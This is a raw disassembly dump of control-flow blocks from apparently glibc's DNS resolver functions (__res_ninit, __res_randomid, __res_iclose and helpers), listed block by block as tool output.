|
|
v
0xb10a655:	mov	eax, dword ptr [ebp - 0x2048]
0xb10a65b:	test	byte ptr [eax + esi*2 + 1], 0x20
0xb10a660:	jne	0xb10a695
None
|
|
|
v
0xb10a9fc:	mov	eax, dword ptr [ebp + 8]
0xb10a9ff:	lea	edx, dword ptr [ebp - 0x2011]
0xb10aa05:	lea	ecx, dword ptr [ebx - 0x47440]
0xb10aa0b:	call	0xb10a020
None
|
|
|
v
0xb10ac57:	lea	eax, dword ptr [ebp - 0x2030]
0xb10ac5d:	mov	dword ptr [esp + 4], eax
0xb10ac61:	mov	dword ptr [esp], esi
0xb10ac64:	call	0xb109600
None
|
|
|
v
0xb10a4ab:	mov	edi, dword ptr [ebp - 0x2060]
0xb10a4b1:	test	edi, edi
0xb10a4b3:	jne	0xb10a448
None
|
|
|
v
0xb10a932:	mov	dword ptr [esp], 0x1c
0xb10a939:	call	0xb0173f0
None
|
|
|
v
0xb10abfe:	add	eax, 1
0xb10ac01:	mov	dword ptr [esp + 4], eax
0xb10ac05:	mov	eax, dword ptr [ebp + 8]
0xb10ac08:	add	eax, 0x60
0xb10ac0b:	mov	dword ptr [esp], eax
0xb10ac0e:	call	0xb07a810
None
|
|
|
v
0xb10a753:	test	cl, cl
0xb10a755:	jle	0xb10a75e
None
|
|
|
v
0xb10a89d:	lea	esi, dword ptr [ebp - 0x200e]
0xb10a8a3:	nop	
0xb10a8a4:	lea	esi, dword ptr [esi]
0xb10a8a8:	add	esi, 1
0xb10a8ab:	movzx	eax, byte ptr [esi]
0xb10a8ae:	cmp	al, 9
0xb10a8b0:	je	0xb10a8a8
None
|
|
|
v
0xb10ab67:	test	al, 0xdf
0xb10ab69:	jne	0xb10ab7e
None
|
|
|
v
0xb10a5e0:	cmp	al, 9
0xb10a5e2:	mov	edi, esi
0xb10a5e4:	jne	0xb10a5f2
None
|
|
|
v
0xb10a670:	mov	eax, dword ptr [ebp - 0x2044]
0xb10a676:	movsx	esi, dl
0xb10a679:	mov	dword ptr [esp + 4], esi
0xb10a67d:	mov	dword ptr [ebp - 0x2040], edx
0xb10a683:	mov	dword ptr [esp], eax
0xb10a686:	call	0xb07a520
None
|
|
|
v
0xb10a468:	test	eax, eax
0xb10a46a:	je	0xb10aa78
None
|
|
|
v
0xb10a7e0:	cmp	dl, 0xa
0xb10a7e3:	je	0xb10a448
None
|
|
|
v
0xb10a858:	mov	byte ptr [esi], 0
0xb10a85b:	mov	ecx, 1
0xb10a860:	add	esi, 1
0xb10a863:	movzx	eax, byte ptr [esi]
0xb10a866:	test	al, al
0xb10a868:	je	0xb10ac26
None
|
|
|
v
0xb10a55b:	jne	0xb10a574
None
|
|
|
v
0xb10a8b6:	cmp	al, 0xa
0xb10a8b8:	mov	edi, esi
0xb10a8ba:	jne	0xb10ac4f
None
|
|
|
v
0xb10a619:	mov	eax, dword ptr gs:[0]
0xb10a61f:	mov	ecx, dword ptr [ebx - 0x110]
0xb10a625:	mov	dword ptr [ebp - 0x2058], edi
0xb10a62b:	mov	eax, dword ptr [eax + ecx]
0xb10a62e:	mov	dword ptr [ebp - 0x2048], eax
0xb10a634:	lea	eax, dword ptr [ebx - 0x47577]
0xb10a63a:	mov	dword ptr [ebp - 0x2044], eax
0xb10a640:	jmp	0xb10a670
None
|
|
|
v
0xb10a5b9:	movzx	eax, byte ptr [ebp - 0x2010]
0xb10a5c0:	cmp	al, 9
0xb10a5c2:	je	0xb10a5cc
None
|
|
|
v
0xb10aa10:	jmp	0xb10a448
None
|
|
|
v
0xb10aaed:	mov	eax, dword ptr [ebp + 8]
0xb10aaf0:	cmp	byte ptr [eax + 0x60], 0
0xb10aaf4:	je	0xb10abc8
None
|
|
|
v
0xb10a33a:	mov	ecx, dword ptr [ebp + 8]
0xb10a33d:	mov	dword ptr [esp + 8], 0xff
0xb10a345:	mov	dword ptr [esp + 4], eax
0xb10a349:	lea	esi, dword ptr [ecx + 0x60]
0xb10a34c:	mov	dword ptr [esp], esi
0xb10a34f:	call	0xb0830a0
None
|
|
|
v
0xb10a4e1:	mov	ecx, dword ptr [ebp + 8]
0xb10a4e4:	mov	dword ptr [esp + 8], 0xff
0xb10a4ec:	mov	dword ptr [esp + 4], eax
0xb10a4f0:	lea	esi, dword ptr [ecx + 0x60]
0xb10a4f3:	mov	dword ptr [esp], esi
0xb10a4f6:	call	0xb0830a0
None
|
|
|
v
0xb10a47f:	mov	esi, dword ptr [ebp - 0x204c]
0xb10a485:	mov	ecx, 6
0xb10a48a:	lea	edi, dword ptr [ebx - 0x475a9]
0xb10a490:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a793:	add	dword ptr [ebp - 0x2050], 1
0xb10a79a:	mov	ecx, dword ptr [ebp - 0x2040]
0xb10a7a0:	cmp	dword ptr [ebp - 0x2050], 9
0xb10a7a7:	mov	eax, ecx
0xb10a7a9:	mov	byte ptr [esi], cl
0xb10a7ab:	jle	0xb10a5e0
None
|
|
|
v
0xb10a841:	mov	ecx, dword ptr [ebp + 8]
0xb10a844:	lea	edi, dword ptr [ecx + 0x5c]
0xb10a847:	cmp	edx, edi
0xb10a849:	jae	0xb10ac1e
None
|
|
|
v
0xb10ab8a:	mov	dword ptr [ebp - 0x205c], 0
0xb10ab94:	mov	dword ptr [ebp - 0x2060], 0
0xb10ab9e:	jmp	0xb10a3eb
None
|
|
|
v
0xb10ac13:	jmp	0xb10aafa
None
|
|
|
v
0xb10a38c:	xor	ecx, ecx
0xb10a38e:	jmp	0xb10a3ae
None
|
|
|
v
0xb10aa60:	mov	esi, edi
0xb10aa62:	mov	edi, dword ptr [ebp - 0x2058]
0xb10aa68:	mov	dword ptr [ebp - 0x2040], 0
0xb10aa72:	jmp	0xb10a6a5
None
|
|
|
v
0xb10a7db:	cmp	dl, 0x20
0xb10a7de:	je	0xb10a7d0
None
|
|
|
v
0xb10a3eb:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb10a3f1:	mov	dword ptr [esp + 4], eax
0xb10a3f5:	lea	eax, dword ptr [ebx - 0x475ba]
0xb10a3fb:	mov	dword ptr [esp], eax
0xb10a3fe:	call	0xb063f60
None
|
|
|
v
0xb10ab70:	add	esi, 1
0xb10ab73:	movzx	eax, byte ptr [esi]
0xb10ab76:	test	al, 0xdf
0xb10ab78:	je	0xb10a3d8
None
|
|
|
v
0xb10a3d8:	mov	byte ptr [esi], 0
0xb10a3db:	mov	dword ptr [ebp - 0x2060], 1
0xb10a3e5:	mov	dword ptr [edx], 0
0xb10a3eb:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb10a3f1:	mov	dword ptr [esp + 4], eax
0xb10a3f5:	lea	eax, dword ptr [ebx - 0x475ba]
0xb10a3fb:	mov	dword ptr [esp], eax
0xb10a3fe:	call	0xb063f60
None
|
|
|
v
0xb10a9e1:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a886:	mov	dword ptr [edx], esi
0xb10a888:	xor	ecx, ecx
0xb10a88a:	add	edx, 4
0xb10a88d:	jmp	0xb10a860
None
|
|
|
v
0xb10a3ba:	mov	dword ptr [edx], esi
0xb10a3bc:	add	esi, 1
0xb10a3bf:	movzx	eax, byte ptr [esi]
0xb10a3c2:	add	edx, 4
0xb10a3c5:	xor	ecx, ecx
0xb10a3c7:	mov	dword ptr [ebp - 0x205c], 1
0xb10a3d1:	test	al, al
0xb10a3d3:	jne	0xb10a3a2
None
|
|
|
v
0xb10a6ce:	mov	eax, dword ptr [ebp + 8]
0xb10a6d1:	mov	ecx, dword ptr [ebp - 0x2050]
0xb10a6d7:	lea	edi, dword ptr [eax + ecx*8]
0xb10a6da:	mov	eax, dword ptr [ebp - 0x2028]
0xb10a6e0:	mov	dword ptr [edi + 0x168], eax
0xb10a6e6:	mov	eax, dword ptr [ebp - 0x2040]
0xb10a6ec:	mov	dword ptr [esp + 4], eax
0xb10a6f0:	lea	eax, dword ptr [ebx - 0x47577]
0xb10a6f6:	mov	dword ptr [esp], eax
0xb10a6f9:	call	0xb07a520
None
|
|
|
v
0xb10ad2d:	cmp	byte ptr [ebp - 0x2028], 0xff
0xb10ad34:	lea	edi, dword ptr [edx + 1]
0xb10ad37:	je	0xb10ad6a
None
|
|
|
v
0xb10a5f2:	cmp	al, 0x20
0xb10a5f4:	je	0xb10a5e8
None
|
|
|
v
0xb10acc5:	mov	dword ptr [ebp - 0x205c], 0
0xb10accf:	jmp	0xb10a3d8
None
|
|
|
v
0xb10a403:	test	eax, eax
0xb10a405:	mov	dword ptr [ebp - 0x2054], eax
0xb10a40b:	je	0xb10aadf
None
|
|
|
v
0xb10abc8:	lea	esi, dword ptr [ebp - 0x2018]
0xb10abce:	mov	dword ptr [esp + 4], 0xff
0xb10abd6:	mov	dword ptr [esp], esi
0xb10abd9:	call	0xb0e3fc0
None
|
|
|
v
0xb10a3b2:	cmp	al, 0x20
0xb10a3b4:	je	0xb10a390
None
|
|
|
v
0xb10a70c:	movsx	ecx, byte ptr [esi + 1]
0xb10a710:	lea	eax, dword ptr [esi + 1]
0xb10a713:	mov	dword ptr [ebp - 0x2044], eax
0xb10a719:	mov	byte ptr [esi], dl
0xb10a71b:	cmp	cl, 0x3b
0xb10a71e:	je	0xb10acba
None
|
|
|
v
0xb10a332:	test	eax, eax
0xb10a334:	je	0xb10ab8a
None
|
|
|
v
0xb10ab4a:	and	edx, 0xc0000000
0xb10ab50:	mov	ax, 0xffff
0xb10ab54:	cmp	edx, 0x80000000
0xb10ab5a:	mov	edx, 0xffffff
0xb10ab5f:	cmovne	eax, edx
0xb10ab62:	jmp	0xb10aa37
None
|
|
|
v
0xb10ac18:	add	esi, 1
0xb10ac1b:	movzx	eax, byte ptr [esi]
0xb10ac1e:	test	al, 0xdf
0xb10ac20:	je	0xb10ac26
None
|
|
|
v
0xb10aa48:	mov	esi, edi
0xb10aa4a:	mov	edi, dword ptr [ebp - 0x2058]
0xb10aa50:	mov	dword ptr [ebp - 0x2040], 0x3b
0xb10aa5a:	jmp	0xb10a6a5
None
|
|
|
v
0xb10a5c4:	cmp	al, 0x20
0xb10a5c6:	jne	0xb10a9d0
None
|
|
|
v
0xb10a4d0:	cmp	dl, 0xa
0xb10a4d3:	je	0xb10a448
None
|
|
|
v
0xb10abde:	test	eax, eax
0xb10abe0:	jne	0xb10aafa
None
|
|
|
v
0xb10a8c0:	movzx	eax, byte ptr [esi]
0xb10a8c3:	test	al, al
0xb10a8c5:	jne	0xb10a8e1
None
|
|
|
v
0xb10a5b1:	repe cmpsb	byte ptr [esi], byte ptr es:[edi]
None
|
|
|
v
0xb10a7b8:	mov	esi, dword ptr [ebp - 0x2060]
0xb10a7be:	test	esi, esi
0xb10a7c0:	jne	0xb10a448
None
|
|
|
v
0xb10ac4f:	test	al, al
0xb10ac51:	je	0xb10a8c0
None
|
|
|
v
0xb10abf6:	test	eax, eax
0xb10abf8:	je	0xb10aafa
None
|
|
|
v
0xb10a518:	sub	eax, 9
0xb10a51b:	cmp	al, 1
0xb10a51d:	jbe	0xb10a531
None
|
|
|
v
0xb10a90a:	lea	eax, dword ptr [ebp - 0x2028]
0xb10a910:	mov	dword ptr [esp + 8], eax
0xb10a914:	mov	dword ptr [esp + 4], edi
0xb10a918:	mov	dword ptr [esp], 0xa
0xb10a91f:	mov	dword ptr [ebp - 0x2040], edx
0xb10a925:	call	0xb109ba0
None
|
|
|
v
0xb10a498:	movzx	eax, byte ptr [ebp - 0x2012]
0xb10a49f:	cmp	al, 9
0xb10a4a1:	je	0xb10a4ab
None
|
|
|
v
0xb10a86e:	cmp	edx, edi
0xb10a870:	jae	0xb10ac1e
None
|
|
|
v
0xb10a60e:	movzx	edx, byte ptr [edi]
0xb10a611:	test	dl, dl
0xb10a613:	je	0xb10ac3e
None
|
|
|
v
0xb10a825:	test	eax, eax
0xb10a827:	je	0xb10a82c
None
|
|
|
v
0xb10a4cb:	cmp	dl, 0x20
0xb10a4ce:	je	0xb10a4c0
None
|
|
|
v
0xb10a860:	add	esi, 1
0xb10a863:	movzx	eax, byte ptr [esi]
0xb10a866:	test	al, al
0xb10a868:	je	0xb10ac26
None
|
|
|
v
0xb10a51f:	add	esi, 1
0xb10a522:	movzx	eax, byte ptr [esi]
0xb10a525:	test	al, al
0xb10a527:	je	0xb10acab
None
|
|
|
v
0xb10acd4:	lea	eax, dword ptr [ebp - 0x203c]
0xb10acda:	mov	dword ptr [esp], eax
0xb10acdd:	mov	dword ptr [esp + 8], 1
0xb10ace5:	mov	dword ptr [esp + 4], 0x7f
0xb10aced:	call	0xb0fd580
None
|
|
|
v
0xb10a93e:	test	eax, eax
0xb10a940:	mov	esi, eax
0xb10a942:	je	0xb10a448
None
|
|
|
v
0xb10a3ae:	cmp	al, 9
0xb10a3b0:	je	0xb10a390
None
|
|
|
v
0xb10a370:	mov	ecx, dword ptr [ebp + 8]
0xb10a373:	mov	dword ptr [ebp - 0x205c], 0
0xb10a37d:	lea	edi, dword ptr [ecx + 0x5c]
0xb10a380:	cmp	edx, edi
0xb10a382:	jae	0xb10ab67
None
|
|
|
v
0xb10a890:	cmp	dword ptr [ebp - 0x2064], 2
0xb10a897:	jg	0xb10a5a0
None
|
|
|
v
0xb10aadf:	mov	eax, dword ptr [ebp + 8]
0xb10aae2:	mov	esi, dword ptr [eax + 0xc]
0xb10aae5:	test	esi, esi
0xb10aae7:	je	0xb10acd4
None
|
|
|
v
0xb10a388:	cmp	al, 0xa
0xb10a38a:	je	0xb10a3d8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__res_ninit
TOTAL BLOCKS :3
0xb10ad90:	push	ebx
0xb10ad91:	sub	esp, 0x18
0xb10ad94:	call	0xb1267db
None
|
|
|
v
0xb10ad99:	add	ebx, 0xa0267
0xb10ad9f:	mov	eax, dword ptr [esp + 0x20]
0xb10ada3:	mov	dword ptr [esp + 4], 0
0xb10adab:	mov	dword ptr [esp], eax
0xb10adae:	call	0xb10a230
None
|
|
|
v
0xb10adb3:	add	esp, 0x18
0xb10adb6:	pop	ebx
0xb10adb7:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__res_randomid
TOTAL BLOCKS :2
0xb10adc0:	sub	esp, 0xc
0xb10adc3:	call	0xb0b69a0
None
|
|
|
v
0xb10adc8:	add	esp, 0xc
0xb10adcb:	movzx	eax, ax
0xb10adce:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__res_iclose
TOTAL BLOCKS :14
0xb10adf5:	xchg	ebx, edx
0xb10adf7:	mov	eax, 6
0xb10adfc:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb10ae82:	mov	ecx, dword ptr [esp + 0xc]
0xb10ae86:	mov	dword ptr [esi + 0x1e4], 0
0xb10ae90:	jmp	0xb10ae4d
None
|
|
|
v
0xb10add0:	push	ebp
0xb10add1:	push	edi
0xb10add2:	push	esi
0xb10add3:	push	ebx
0xb10add4:	sub	esp, 0x1c
0xb10add7:	mov	ebp, dword ptr [esp + 0x30]
0xb10addb:	call	0xb1267db
None
|
|
|
v
0xb10ade0:	add	ebx, 0xa0220
0xb10ade6:	movzx	ecx, byte ptr [esp + 0x34]
0xb10adeb:	mov	edx, dword ptr [ebp + 0x1c4]
0xb10adf1:	test	edx, edx
0xb10adf3:	js	0xb10ae16
None
|
|
|
v
0xb10ae58:	xor	eax, eax
0xb10ae5a:	mov	word ptr [ebp + 0x1e2], ax
0xb10ae61:	add	esp, 0x1c
0xb10ae64:	pop	ebx
0xb10ae65:	pop	esi
0xb10ae66:	pop	edi
0xb10ae67:	pop	ebp
0xb10ae68:	ret	
None
|
|
|
v
0xb10ae03:	xchg	ebx, edx
0xb10ae05:	and	dword ptr [ebp + 0x1c8], 0xfffffffc
0xb10ae0c:	mov	dword ptr [ebp + 0x1c4], 0xffffffff
0xb10ae16:	mov	esi, ebp
0xb10ae18:	xor	edi, edi
0xb10ae1a:	mov	edx, dword ptr [esi + 0x1e4]
0xb10ae20:	test	edx, edx
0xb10ae22:	je	0xb10ae4d
None
|
|
|
v
0xb10ae16:	mov	esi, ebp
0xb10ae18:	xor	edi, edi
0xb10ae1a:	mov	edx, dword ptr [esi + 0x1e4]
0xb10ae20:	test	edx, edx
0xb10ae22:	je	0xb10ae4d
None
|
|
|
v
0xb10ae3d:	xchg	ebx, edx
0xb10ae3f:	mov	dword ptr [esi + 0x1d4], 0xffffffff
0xb10ae49:	test	cl, cl
0xb10ae4b:	jne	0xb10ae70
None
|
|
|
v
0xb10ae49:	test	cl, cl
0xb10ae4b:	jne	0xb10ae70
None
|
|
|
v
0xb10ae1a:	mov	edx, dword ptr [esi + 0x1e4]
0xb10ae20:	test	edx, edx
0xb10ae22:	je	0xb10ae4d
None
|
|
|
v
0xb10ae2f:	xchg	ebx, edx
0xb10ae31:	mov	eax, 6
0xb10ae36:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb10ae70:	mov	eax, dword ptr [esi + 0x1e4]
0xb10ae76:	mov	dword ptr [esp + 0xc], ecx
0xb10ae7a:	mov	dword ptr [esp], eax
0xb10ae7d:	call	0xb017470
None
|
|
|
v
0xb10ae24:	mov	edx, dword ptr [esi + 0x1d4]
0xb10ae2a:	cmp	edx, 0xff
0xb10ae2d:	je	0xb10ae49
None
|
|
|
v
0xb10ae4d:	add	edi, 1
0xb10ae50:	add	esi, 4
0xb10ae53:	cmp	edi, 3
0xb10ae56:	jne	0xb10ae1a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10aec0
TOTAL BLOCKS :9
0xb10af06:	pop	ebx
0xb10af07:	pop	esi
0xb10af08:	ret	
None
|
|
|
v
0xb10aec7:	push	esi
0xb10aec8:	mov	esi, dword ptr gs:[0]
0xb10aecf:	push	ebx
0xb10aed0:	call	0xb1267db
None
|
|
|
v
0xb10af08:	ret	
None
|
|
|
v
0xb10aefc:	movsx	ecx, dl
0xb10aeff:	test	byte ptr [esi + ecx*2 + 1], 0x20
0xb10af04:	je	0xb10aee8
None
|
|
|
v
0xb10aeed:	cmp	dl, 0x2c
0xb10aef0:	je	0xb10af06
None
|
|
|
v
0xb10aec0:	movzx	edx, byte ptr [eax]
0xb10aec3:	test	dl, dl
0xb10aec5:	je	0xb10af08
None
|
|
|
v
0xb10aed5:	add	ebx, 0xa012b
0xb10aedb:	mov	ecx, dword ptr [ebx - 0x110]
0xb10aee1:	mov	esi, dword ptr [esi + ecx]
0xb10aee4:	jmp	0xb10aefc
None
|
|
|
v
0xb10aee8:	cmp	dl, 0x23
0xb10aeeb:	je	0xb10af06
None
|
|
|
v
0xb10aef2:	add	eax, 1
0xb10aef5:	movzx	edx, byte ptr [eax]
0xb10aef8:	test	dl, dl
0xb10aefa:	je	0xb10af06
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10af10
TOTAL BLOCKS :29
0xb10af90:	add	esi, 1
0xb10af93:	movzx	ecx, byte ptr [esi]
0xb10af96:	movsx	eax, cl
0xb10af99:	test	byte ptr [edx + eax*2 + 1], 0x20
0xb10af9e:	jne	0xb10af90
None
|
|
|
v
0xb10af38:	mov	eax, esi
0xb10af3a:	call	0xb10aec0
None
|
|
|
v
0xb10af10:	push	ebp
0xb10af11:	push	edi
0xb10af12:	push	esi
0xb10af13:	push	ebx
0xb10af14:	call	0xb1267db
None
|
|
|
v
0xb10b029:	mov	edi, dword ptr [esp + 0x1c]
0xb10b02d:	mov	dword ptr [esp + 0x10], 4
0xb10b035:	mov	dword ptr [esp + 0xc], edi
0xb10b039:	mov	edi, dword ptr [esp + 0x18]
0xb10b03d:	mov	dword ptr [esp + 4], eax
0xb10b041:	lea	eax, dword ptr [esp + 0x2c]
0xb10b045:	mov	dword ptr [esp], eax
0xb10b048:	mov	dword ptr [esp + 8], edi
0xb10b04c:	call	0xb04d4c0
None
|
|
|
v
0xb10af3f:	mov	edx, dword ptr [ebp + 0x18]
0xb10af42:	mov	edi, eax
0xb10af44:	sub	eax, esi
0xb10af46:	cmp	edx, 3
0xb10af49:	jg	0xb10b009
None
|
|
|
v
0xb10b089:	lea	eax, dword ptr [ebx - 0x4243c]
0xb10b08f:	mov	dword ptr [esp + 4], eax
0xb10b093:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb10b099:	mov	dword ptr [esp + 8], 5
0xb10b0a1:	mov	dword ptr [esp], eax
0xb10b0a4:	call	0xb028340
None
|
|
|
v
0xb10b055:	mov	eax, dword ptr [esp + 0x2c]
0xb10b059:	mov	dword ptr [esp], 0
0xb10b060:	mov	dword ptr [esp + 8], eax
0xb10b064:	lea	eax, dword ptr [ebx - 0x47d3b]
0xb10b06a:	mov	dword ptr [esp + 4], eax
0xb10b06e:	call	0xb062c40
None
|
|
|
v
0xb10b051:	test	eax, eax
0xb10b053:	js	0xb10b07f
None
|
|
|
v
0xb10b0a9:	mov	edi, dword ptr [esp + 0x1c]
0xb10b0ad:	mov	dword ptr [esp + 0xc], edi
0xb10b0b1:	mov	edi, dword ptr [esp + 0x18]
0xb10b0b5:	mov	dword ptr [esp + 4], eax
0xb10b0b9:	lea	eax, dword ptr [esp + 0x2c]
0xb10b0bd:	mov	dword ptr [esp], eax
0xb10b0c0:	mov	dword ptr [esp + 8], edi
0xb10b0c4:	call	0xb04d4c0
None
|
|
|
v
0xb10af4f:	lea	ecx, dword ptr [edx + 1]
0xb10af52:	mov	dword ptr [ebp + 0x18], ecx
0xb10af55:	mov	dword ptr [esp], esi
0xb10af58:	mov	esi, edi
0xb10af5a:	mov	dword ptr [esp + 4], eax
0xb10af5e:	mov	dword ptr [esp + 0x14], edx
0xb10af62:	call	0xb07ab50
None
|
|
|
v
0xb10af8b:	nop	
0xb10af8c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10afcc:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10afe0:	cmp	al, 0x23
0xb10afe2:	je	0xb10b089
None
|
|
|
v
0xb10afff:	add	esp, 0x3c
0xb10b002:	mov	eax, esi
0xb10b004:	pop	ebx
0xb10b005:	pop	esi
0xb10b006:	pop	edi
0xb10b007:	pop	ebp
0xb10b008:	ret	
None
|
|
|
v
0xb10b009:	lea	eax, dword ptr [ebx - 0x42474]
0xb10b00f:	mov	dword ptr [esp + 4], eax
0xb10b013:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb10b019:	mov	dword ptr [esp + 8], 5
0xb10b021:	mov	dword ptr [esp], eax
0xb10b024:	call	0xb028340
None
|
|
|
v
0xb10afd0:	add	esi, 1
0xb10afd3:	movzx	eax, byte ptr [esi]
0xb10afd6:	movsx	ecx, al
0xb10afd9:	test	byte ptr [edx + ecx*2 + 1], 0x20
0xb10afde:	jne	0xb10afd0
None
|
|
|
v
0xb10b0cd:	xor	eax, eax
0xb10b0cf:	jmp	0xb10b081
None
|
|
|
v
0xb10afb9:	movzx	eax, byte ptr [esi + 1]
0xb10afbd:	lea	ecx, dword ptr [esi + 1]
0xb10afc0:	movsx	esi, al
0xb10afc3:	test	byte ptr [edx + esi*2 + 1], 0x20
0xb10afc8:	mov	esi, ecx
0xb10afca:	je	0xb10afe0
None
|
|
|
v
0xb10af19:	add	ebx, 0xa00e7
0xb10af1f:	sub	esp, 0x3c
0xb10af22:	mov	esi, dword ptr [esp + 0x50]
0xb10af26:	mov	dword ptr [esp + 0x18], eax
0xb10af2a:	mov	dword ptr [esp + 0x1c], edx
0xb10af2e:	mov	ebp, dword ptr [ebx - 0xfc]
0xb10af34:	lea	esi, dword ptr [esi]
0xb10af38:	mov	eax, esi
0xb10af3a:	call	0xb10aec0
None
|
|
|
v
0xb10afe8:	test	al, al
0xb10afea:	je	0xb10b089
None
|
|
|
v
0xb10b073:	mov	eax, dword ptr [esp + 0x2c]
0xb10b077:	mov	dword ptr [esp], eax
0xb10b07a:	call	0xb017470
None
|
|
|
v
0xb10b0c9:	test	eax, eax
0xb10b0cb:	jns	0xb10b055
None
|
|
|
v
0xb10aff7:	test	al, al
0xb10aff9:	jne	0xb10af38
None
|
|
|
v
0xb10af67:	mov	edx, dword ptr [esp + 0x14]
0xb10af6b:	mov	dword ptr [ebp + edx*4 + 0x1c], eax
0xb10af6f:	mov	eax, dword ptr gs:[0]
0xb10af75:	mov	edx, dword ptr [ebx - 0x110]
0xb10af7b:	movzx	ecx, byte ptr [edi]
0xb10af7e:	mov	edx, dword ptr [eax + edx]
0xb10af81:	movsx	eax, cl
0xb10af84:	test	byte ptr [edx + eax*2 + 1], 0x20
0xb10af89:	je	0xb10afa0
None
|
|
|
v
0xb10b081:	add	esp, 0x3c
0xb10b084:	pop	ebx
0xb10b085:	pop	esi
0xb10b086:	pop	edi
0xb10b087:	pop	ebp
0xb10b088:	ret	
None
|
|
|
v
0xb10b07f:	xor	eax, eax
0xb10b081:	add	esp, 0x3c
0xb10b084:	pop	ebx
0xb10b085:	pop	esi
0xb10b086:	pop	edi
0xb10b087:	pop	ebp
0xb10b088:	ret	
None
|
|
|
v
0xb10afa8:	mov	eax, 1
0xb10afad:	shl	eax, cl
0xb10afaf:	mov	ecx, eax
0xb10afb1:	and	ecx, 0xc001
0xb10afb7:	je	0xb10aff0
None
|
|
|
v
0xb10afa0:	sub	ecx, 0x2c
0xb10afa3:	cmp	cl, 0xf
0xb10afa6:	ja	0xb10aff0
None
|
|
|
v
0xb10aff0:	movzx	eax, byte ptr [esi]
0xb10aff3:	cmp	al, 0x23
0xb10aff5:	je	0xb10afff
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10b0e0
TOTAL BLOCKS :13
0xb10b118:	and	edx, 0xfffffffb
0xb10b11b:	or	edx, 2
0xb10b11e:	mov	dword ptr [ebp + 0x2c], edx
0xb10b121:	add	esp, 0x1c
0xb10b124:	mov	eax, esi
0xb10b126:	pop	ebx
0xb10b127:	pop	esi
0xb10b128:	pop	edi
0xb10b129:	pop	ebp
0xb10b12a:	ret	
None
|
|
|
v
0xb10b156:	jmp	0xb10b121
None
|
|
|
v
0xb10b130:	lea	eax, dword ptr [ebx - 0x47574]
0xb10b136:	mov	dword ptr [esp + 8], 4
0xb10b13e:	mov	dword ptr [esp + 4], eax
0xb10b142:	mov	dword ptr [esp], edi
0xb10b145:	mov	dword ptr [esp + 0xc], edx
0xb10b149:	call	0xb017430
None
|
|
|
v
0xb10b172:	test	eax, eax
0xb10b174:	je	0xb10b188
None
|
|
|
v
0xb10b158:	lea	eax, dword ptr [ebx - 0x4886e]
0xb10b15e:	mov	dword ptr [esp + 8], 3
0xb10b166:	mov	dword ptr [esp + 4], eax
0xb10b16a:	mov	dword ptr [esp], edi
0xb10b16d:	call	0xb017430
None
|
|
|
v
0xb10b121:	add	esp, 0x1c
0xb10b124:	mov	eax, esi
0xb10b126:	pop	ebx
0xb10b127:	pop	esi
0xb10b128:	pop	edi
0xb10b129:	pop	ebp
0xb10b12a:	ret	
None
|
|
|
v
0xb10b0e0:	push	ebp
0xb10b0e1:	push	edi
0xb10b0e2:	mov	edi, eax
0xb10b0e4:	push	esi
0xb10b0e5:	push	ebx
0xb10b0e6:	call	0xb1267db
None
|
|
|
v
0xb10b102:	mov	ebp, dword ptr [ebx - 0xfc]
0xb10b108:	mov	edx, dword ptr [ebp + 0x2c]
0xb10b10b:	mov	ecx, edx
0xb10b10d:	or	ecx, 6
0xb10b110:	cmp	eax, 4
0xb10b113:	mov	dword ptr [ebp + 0x2c], ecx
0xb10b116:	je	0xb10b130
None
|
|
|
v
0xb10b0eb:	add	ebx, 0x9ff15
0xb10b0f1:	sub	esp, 0x1c
0xb10b0f4:	call	0xb10aec0
None
|
|
|
v
0xb10b176:	mov	ebp, dword ptr [ebx - 0xfc]
0xb10b17c:	mov	edx, dword ptr [ebp + 0x2c]
0xb10b17f:	jmp	0xb10b118
None
|
|
|
v
0xb10b14e:	mov	edx, dword ptr [esp + 0xc]
0xb10b152:	test	eax, eax
0xb10b154:	jne	0xb10b118
None
|
|
|
v
0xb10b188:	mov	eax, dword ptr [ebx - 0xfc]
0xb10b18e:	and	dword ptr [eax + 0x2c], 0xfffffff9
0xb10b192:	add	esp, 0x1c
0xb10b195:	pop	ebx
0xb10b196:	mov	eax, esi
0xb10b198:	pop	esi
0xb10b199:	pop	edi
0xb10b19a:	pop	ebp
0xb10b19b:	ret	
None
|
|
|
v
0xb10b0f9:	mov	esi, eax
0xb10b0fb:	sub	eax, edi
0xb10b0fd:	cmp	eax, 3
0xb10b100:	je	0xb10b158
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10b1a0
TOTAL BLOCKS :14
0xb10b1ad:	add	ebx, 0x9fe53
0xb10b1b3:	sub	esp, 0x3c
0xb10b1b6:	mov	esi, dword ptr [esp + 0x50]
0xb10b1ba:	mov	dword ptr [esp + 8], 2
0xb10b1c2:	mov	dword ptr [esp], esi
0xb10b1c5:	lea	eax, dword ptr [ebx - 0x4ab83]
0xb10b1cb:	mov	dword ptr [esp + 4], eax
0xb10b1cf:	call	0xb017430
None
|
|
|
v
0xb10b264:	test	eax, eax
0xb10b266:	js	0xb10b292
None
|
|
|
v
0xb10b20a:	test	eax, eax
0xb10b20c:	jne	0xb10b228
None
|
|
|
v
0xb10b228:	lea	eax, dword ptr [ebx - 0x42408]
0xb10b22e:	mov	dword ptr [esp + 4], eax
0xb10b232:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb10b238:	mov	dword ptr [esp + 8], 5
0xb10b240:	mov	dword ptr [esp], eax
0xb10b243:	call	0xb028340
None
|
|
|
v
